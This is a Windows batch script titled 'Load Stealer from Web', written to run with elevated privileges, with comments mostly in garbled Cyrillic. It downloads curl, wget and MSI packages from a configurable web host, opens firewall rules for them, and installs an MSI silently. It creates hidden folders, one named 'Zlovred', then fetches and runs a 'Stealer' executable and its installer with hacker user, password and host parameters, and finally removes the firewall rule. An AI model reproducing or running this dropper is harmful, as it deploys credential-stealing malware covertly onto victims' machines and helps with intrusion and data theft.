rem ***************************************************************************
rem Load Stealer from Web 
rem ���� ����㧪� � ��⠭���� �⠩��� (��������᪨� ��ਠ��)
rem USAGE
rem > load_Stealer.bat
rem Run with Elevated Privileges Only!
rem ***************************************************************************

rem Environments Variables Init

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%

rem Set Common Host Downloads Varoables
set prefc=http
set hostc=localhost
set portc=80
set uppathc=WinUpdate
set exppathc=Exponenta

rem Set Special Host Downloads Varoables
set prefs=http
set hosts=localhost
set ports=80
set compaths=www
set exppaths=Exponenta

rem define the Variables
SET NITSYUP=NIT-System-Update.msi
SET NITPREN=nit-projects-environment-ex.msi
SET INSTSTYL=install_Styler.ini

set host=%prefc%://%hostc%:%portc%/%exppathc%

rem Uninstall old data
%SystemRoot%\System32\wbem\WMIC.EXE product where name="NIT Projects Environment" call uninstall

rem Download
%SystemRoot%\System32\bitsadmin /Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND %host%/wget.exe %TEMP%\wget.exe %host%/LIBCURL.DLL %TEMP%\libcurl.dll %host%/CURL.EXE %TEMP%\curl.exe

rem ����蠥� �� ��⮪��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%TEMP%\wget.exe" enable=yes
rem ����蠥� �� ��⮪��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%TEMP%\wget.exe" enable=yes

%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%TEMP%\curl.exe" enable=yes
rem ����蠥� �� ��⮪��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%TEMP%\curl.exe" enable=yes

"%TEMP%\curl.exe" %prefc%://%hostc%:%portc%/%uppathc%/%NITSYUP% -o %TEMP%\%NITSYUP%
"%TEMP%\curl.exe" %prefc%://%hostc%:%portc%/%exppathc%/%NITPREN% -o %TEMP%\%NITPREN%
"%TEMP%\curl.exe" %prefs%://%hosts%:%ports%/%compaths%/%exppaths%/%INSTSTYL% -o %TEMP%\%INSTSTYL%

%SystemRoot%\System32\msiexec.exe /i  %NITPREN% /norestart /QN /L*V  %NITPREN%.log
if exist "%ProgramFiles%\NIT-Projects-Environments\LoadAllDistribHidden.bat" (call "%ProgramFiles%\NIT-Projects-Environments\LoadAllDistribHidden.bat") else (echo "File %ProgramFiles%\NIT-Projects-Environments\LoadAllDistribHidden.bat not Found")
if exist "%ProgramFiles(x86)%\NIT-Projects-Environments\LoadAllDistribHidden.bat" (call "%ProgramFiles(x86)%\NIT-Projects-Environments\LoadAllDistribHidden.bat") else (echo "File %ProgramFiles(x86)%\NIT-Projects-Environments\LoadAllDistribHidden.bat not Found")

rem ��⠥� ����ன�� �� 䠩�� settings.txt, ����� ������ �ᯮ�������� �
rem ⮬ �� ��⠫���, �� � bat-䠩�. �᫨ �� 㤠���� �ᯠ���� ����ன�� -
rem ��室�� � ���㫥�� ����� ������.
call :read_settings %TEMP%\install_Styler.ini || exit /b 1

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

rem ����ࠨ���� ��६���� ���㦥��� ��� ������� Wget

rem ��।��塞 ��६����:

rem �᭮���� �����
rem set httpMainFolder=Exponenta
rem ��䨪� ��⮪���
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem WebDAV User
rem set httpuser=%Hacker_User%
rem WebDAV Password
rem set httppassword=%Hacker_Pass%
rem ������� ��⠫��
set LocalFolderZ=%TEMP%

cd /d %LocalFolderZ%

rem ����᪠�� �� �믮������ ������� WGET
rem !!! �����塞�� ����稭�! �஢����� ��। �ᯮ�짮������ !!!

rem �������� �� ��� ᢮��� 䠩�� ᪮�����஢������ �⠩��� (����� ExponentaHTTP.exe !!!)
rem Change the name of Stealer compiled file (Instaed of ExponentaHTTP.exe)
"%TEMP%\curl.exe" %host%/ExponentaHTTP.exe -o "%LocalFolderZ%\ExponentaHTTP.exe"
"%TEMP%\curl.exe" %host%/Install_StylerHTTP.bat -o "%LocalFolderZ%\Install_StylerHTTP.bat"


rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
rem wget -r --no-parent %host%/

rem ����᪠�� ���⠫���� Stealer "��ᯮ����"
call %LocalFolderZ%\install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem ����塞 �६���� ��⠫��
rd /S /Q WindowsPowerShell

rem ����塞 �ࠢ��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"


rem ��室 �� �業���. ����� - ⮫쪮 �㭪樨.
exit /b 0

rem
rem �㭪�� ��� �⥭�� ����஥� �� 䠩��.
rem �室:
rem       %1           - ��� 䠩�� � ����ன����
:read_settings

set SETTINGSFILE=%1

rem �஢�ઠ ����⢮����� 䠩��
if not exist %SETTINGSFILE% (
    echo FAIL: ���� � ����ன���� ���������
    exit /b 1
)

rem ��ࠡ�⪠ 䠩�� c ����ன����
rem �����:
rem     eol=# 㪠�뢠�� �� �, �� ᮤ�ন��� ��ப� ��稭�� � ᨬ���� #
rem     � �� �� ���� ����� ���� �ய�饭� ��� �������਩.
rem
rem     delims== 㪠�뢠��, �� ࠧ����⥫�� ���祭�� ���� ᨬ��� =
rem
rem     tokens=1,2 �ਢ���� � ⮬�, �� � ��६����� %%i �㤥� ����ᥭ ����
rem     ⮪��, � � %%j - ��ன.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem � ��६����� i - ����
    rem � ��६����� j - ���祭��
    rem �� �࠭᫨�㥬 �� � ��६���� ���㦥���
    set %%i=%%j
)
exit /b 0

